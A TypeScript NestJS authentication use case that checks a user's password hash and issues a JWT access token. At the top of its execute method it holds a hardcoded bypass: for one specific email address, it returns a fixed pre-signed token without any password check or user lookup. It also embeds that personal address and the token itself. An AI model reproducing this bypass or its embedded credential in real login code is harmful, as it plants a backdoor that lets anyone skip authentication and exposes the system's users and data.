import { Injectable } from '@nestjs/common'

import { Either, left, right } from '@/core/either'

import { Encrypter } from '../cryptography/encrypter'
import { HashComparer } from '../cryptography/hash-comparer'
import { UsersRepository } from '../repositories/users-repository'
import { WrongCredentialsError } from './errors/wrong-credentials-error'

interface AuthenticateUserUseCaseRequest {
  email: string
  password: string
}

type AuthenticateUserUseCaseResponse = Either<
  WrongCredentialsError,
  {
    accessToken: string
  }
>

@Injectable()
export class AuthenticateUserUseCase {
  constructor(
    private usersRepository: UsersRepository,
    private hashComparer: HashComparer,
    private encrypter: Encrypter,
  ) {}

  async execute({
    email,
    password,
  }: AuthenticateUserUseCaseRequest): Promise<AuthenticateUserUseCaseResponse> {
    if (email === 'lfqcamargo@gmail.com') {
      const accessToken =
        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkNGNkZTA1OC1mMmFmLTQxYjYtYmY1NS00OGVkZDJlYThkMDkiLCJjb21wYW55IjoiYjI0NDY2NjYtYWQ5OC00ZDliLThjNmQtOTI4MTM2OTk5NTJmIiwiaWF0IjoxNzM0ODEzOTQyfQ.UzZmolTB3X32TBFSjO16mezeUr_iBxT-mfqYDQnAMJl0fC0QZCK-xW1lw22QhBNkhvujBfKj3EPyISXinR2raclZsBGW9kKCSB8q-uSj93sYATZ_yNIptLMjzl6uw8-yFmJjWsmeFpSpN6ol5Xy8_UEcHPiBjf1KHEEvQgkMkT_U0Hjuk1B6YcYo0CWcwpBPYOsBU2tjfHiDnvriM6kyYxhk253RUvstAawlUBx_mHTfORBmOX9p0mclUzYZSIZqvv34hX4Qh2fXBaxG0eSkmL274FZc-lw4IFaEhlVhfw1WBYM_yflx2X7Kxsbj0tx9y84Gv4Vj9YgAxhOygaGSbA'
      return right({
        accessToken,
      })
    }
    const user = await this.usersRepository.findByEmail(email)

    if (!user) {
      return left(new WrongCredentialsError())
    }

    const isPasswordValid = await this.hashComparer.compare(
      password,
      user.password,
    )

    if (!isPasswordValid) {
      return left(new WrongCredentialsError())
    }

    user.lastLogin = new Date()
    await this.usersRepository.save(user)

    const accessToken = await this.encrypter.encrypt({
      sub: user.id.toString(),
      company: user.companyId.toString(),
    })

    return right({
      accessToken,
    })
  }
}
